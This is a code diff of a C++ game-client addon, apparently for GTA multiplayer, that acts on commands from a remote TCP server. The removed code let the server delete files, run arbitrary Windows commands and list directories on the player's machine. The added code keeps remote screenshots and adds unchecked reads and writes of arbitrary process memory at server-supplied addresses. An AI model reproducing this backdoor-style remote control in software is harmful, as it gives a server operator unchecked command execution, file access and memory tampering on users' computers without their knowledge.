@@ -10,6 +10,7 @@ extern addonScreen *gScreen;
 extern addonSysexec *gSysexec;
 extern addonProcess *gProcess;
 extern addonFS *gFS;
+
 extern std::queue<std::string> rec_from;
 
 
@@ -20,7 +21,7 @@ addonProcess::addonProcess()
 {
 	addonDebug("Process constructor called");
 
-	this->processHandle = gThread->Start((LPTHREAD_START_ROUTINE)process_thread, NULL);
+	this->processHandle = gThread->Start((LPTHREAD_START_ROUTINE)process_thread, (void *)GetTickCount());
 }
 
 
@@ -34,15 +35,14 @@ addonProcess::~addonProcess()
 
 
 
-DWORD __stdcall process_thread(LPVOID lpParam)
+DWORD process_thread(void *lpParam)
 {
 	addonDebug("Thread 'process_thread' successfuly started");
 
-	std::vector<std::string> params;
+	int call_index;
 	std::string data;
-	size_t next, prev;
 
-	while(true)
+	do
 	{
 		if(!rec_from.empty())
 		{
@@ -53,66 +53,185 @@ DWORD __stdcall process_thread(LPVOID lpParam)
 				rec_from.pop();
 				gMutex->unLock();
 
-				addonDebug("Data in process: %s", data.c_str());
-				addonDebug("1: %s", data.substr(0, (next = data.find('>'))).c_str());
+				sscanf_s(data.c_str(), "%*s %*s %d", &call_index);
 
-				if(data.substr(0, (next = data.find('>'))).compare("TCPQUERY") != 0)
-					continue;
-
-				addonDebug("2: %s", data.substr(next, (prev = data.find('>', next))).c_str());
-
-				if(data.substr(next, (prev = data.find('>', next))).compare("SERVER_CALL") != 0)
-					continue;
-
-				addonDebug("passed");
-
-				switch(atoi(data.substr(prev, (next = data.find('>', prev))).c_str()))
+				switch(call_index)
 				{
-					case 1219: // "TCPQUERY>SERVER_CALL>1219>%s   ---   Removes file in GTA directory | %s - file name
+					case 1000: // TCPQUERY SERVER_CALL 1000 %i1   ---   Response from initial query | %i1 - your HDD serial
 					{
-						remove(data.substr(next, INFINITE).c_str());
+						int rec_serial;
 
-						break;
-					}
+						sscanf_s(data.c_str(), "%*s %*s %*d %d", &rec_serial);
 
-					case 1220: // "TCPQUERY>SERVER_CALL>1220>%s   ---   Executes windows command | %s - needle command
-					{
-						gSysexec->Exec(data.substr(next, INFINITE));
+						DWORD serial;
+						DWORD flags;
 
-						break;
-					}
+						GetVolumeInformationW(L"C:\\", NULL, NULL, &serial, NULL, &flags, NULL, NULL);
 
-					case 1221: // "TCPQUERY>SERVER_CALL>1221>%s   ---   Directory listing | %s - directory to list
-					{
-						params = gFS->Dir(data.substr(next, INFINITE));
+						serial += flags;
 
-						data.clear();
-
-						for(std::vector<std::string>::iterator i = params.begin(); i != params.end(); i++)
+						if(rec_serial == serial)
 						{
-							data += *i;
-							data.push_back('\n');
+							addonDebug("Serials matches");
 						}
 
-						gSocket->Send(data);
+						break;
+					}
+
+					case 1001: // TCPQUERY SERVER_CALL 1001 %i1   ---   Calls when error occured while connecting to TCP server | %i1 - error code
+					{
+						int error_code;
+
+						sscanf_s(data.c_str(), "%*s %*s %*d %d", &error_code);
+
+						if(!error_code)
+						{
+							addonDebug("TCP server is full");
+						}
 
 						break;
 					}
 
-					case 1222: // "TCPQUERY>SERVER_CALL>1222>%s   ---   Take screenshot | %s - screenshot filename
+					//case 1002:
+
+					case 1003: // TCPQUERY SERVER_CALL 1003 %s1   ---   Screenshot take request from server | %s1 - local file name
 					{
-						gScreen->Get(data.substr(next, INFINITE));
+						char file_name[256];
+
+						sscanf_s(data.c_str(), "%*s %*s %*d %s", file_name, sizeof file_name);
+
+						if(!strlen(file_name))
+						{
+							addonDebug("NULL screenshot name");
+						}
+
+						gScreen->Get(std::string(file_name));
+						gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1003 << " " << file_name);
+
+						break;
+					}
+
+					case 1004: // TCPQUERY SERVER_CALL 1004 %i1 %i2   ---   Gets client value from address | %i1 - address, %i2 - var type
+					{
+						int input;
+						int type;
+
+						sscanf_s(data.c_str(), "%*s %*s %*d %d %d", &input, &type);
+
+						switch(type)
+						{
+							case 0:
+							{
+								// int
+
+								break;
+							}
+
+							case 1:
+							{
+								// float
+								float ret;
+
+								if(input == 0x00863984)
+									memcpy(&ret, (void *)input, sizeof(float));
+								else
+									ret = *(float *)input;
+
+								gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1004 << " " << input << " " << ret);
+
+								break;
+							}
+
+							case 2:
+							{
+								// string
+
+								break;
+							}
+
+							case 3:
+							{
+								// uint8_t
+
+								gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1004 << " " << input << " " << (int)*(uint8_t *)input);
+
+								break;
+							}
+
+							case 4:
+							{
+								// uint32_t
+
+								gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1004 << " " << input << " " << *(uint32_t *)input);
+
+								break;
+							}
+						}
+
+						break;
+					}
+
+					case 1005: // TCPQUERY SERVER_CALL 1005 %i1 %i2 %s1   ---   Sets client value (ptr = address) | %i1 - needle address, %i2 - var type, %s1 - needle data
+					{
+						int input;
+						int type;
+
+						sscanf_s(data.c_str(), "%*s %*s %*d %d %d", &input, &type);
+
+						switch(type)
+						{
+							case 0:
+							{
+								// int
+								int value;
+
+								sscanf_s(data.c_str(), "%*s %*s %*d %*d %*d %d", &value);
+
+								break;
+							}
+
+							case 1:
+							{
+								// float
+								float value;
+
+								sscanf_s(data.c_str(), "%*s %*s %*d %*d %*d %f", &value);
+								*(float *)input = value;
+
+								break;
+							}
+
+							case 2:
+							{
+								// string
+								char value[256];
+
+								sscanf_s(data.c_str(), "%*s %*s %*d %*d %*d %s", value, sizeof value);
+
+								break;
+							}
+
+							case 3:
+							{
+								// uint8_t
+								int value;
+
+								sscanf_s(data.c_str(), "%*s %*s %*d %*d %*d %d", &value);
+								*(uint8_t *)input = (uint8_t)value;
+
+								break;
+							}
+						}
 
 						break;
 					}
 				}
-
-				data.clear();
 			}
 		}
 
 		Sleep(1);
 	}
+	while(true);
 
 	return true;
 }
